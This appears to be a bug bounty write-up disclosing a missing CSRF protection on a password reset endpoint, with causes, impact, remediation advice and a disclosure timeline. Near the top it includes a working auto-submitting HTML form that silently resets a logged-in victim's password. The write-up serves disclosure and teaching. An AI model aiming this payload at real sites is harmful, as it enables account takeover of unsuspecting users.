# 🔓 CSRF Attack in Password Reset

During a bug bounty assessment, I discovered that the password reset functionality lacked **Cross-Site Request Forgery (CSRF)** protection, which allowed attackers to reset user passwords without their knowledge.

---

## 🧪 Exploit

The following HTML could be embedded in a malicious site. If a logged-in user visits the page, their password gets reset to `hacked123`:

```html
<form action="https://target.com/reset-password" method="POST">
  <input type="hidden" name="password" value="hacked123" />
</form>
<script>document.forms[0].submit()</script>
<Note>This attack works silently in the background without any user interaction.</Note>

## ⚙️ Why It Worked

- No CSRF token was implemented.
- No SameSite cookie protection.
- The endpoint didn't check the Origin or Referer headers.

## 💥 Impact

- An attacker could take over any account by tricking an authenticated user into visiting a crafted page.
- Could lead to full account compromise and loss of sensitive data.

## 🛡️ Remediation

To mitigate this vulnerability:

- Implement CSRF tokens on all state-changing operations.
- Set SameSite cookies to Strict or Lax where applicable.
- Validate Referer/Origin headers as an additional layer of defense.

## 📌 Disclosure Timeline

1. April 15 – Vulnerability discovered during manual testing.
2. April 16 – Report submitted to the platform.
3. April 17 – Developer acknowledged issue.
4. April 18 – Fix deployed and verified.

## 🔚 Conclusion

CSRF vulnerabilities are still common in modern apps and can have devastating effects. Developers should assume that every form needs CSRF protection—especially those involving account credentials.

<Note>Use tools like OWASP ZAP or Burp Suite to automate CSRF detection.</Note>
